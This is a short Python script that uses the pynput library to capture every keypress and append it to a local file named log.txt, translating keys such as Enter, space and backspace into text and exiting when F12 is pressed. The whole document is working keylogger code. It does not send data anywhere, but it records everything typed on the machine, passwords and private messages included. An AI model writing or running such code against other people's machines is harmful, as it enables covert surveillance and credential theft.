from pynput.keyboard import Listener

def anonymous(key):
	key = str(key)
	key = key.replace("'", "")
	if key == "Key.ctrl_l" or key == "Key.shift" or key == "Key.shift_r":
		key = ""
	if key == "Key.enter":
		key = "\n"
	if key == "Key.f12":
		raise SystemExit(0)
	if key == "Key.alt_l":
		key = "\n"
	if key == "Key.space":
		key = " "
	if key == "Key.backspace":
		key = "\b"
	with open("log.txt", "a") as file:
		file.write(key)

with Listener(on_press = anonymous) as tracker:
	tracker.join()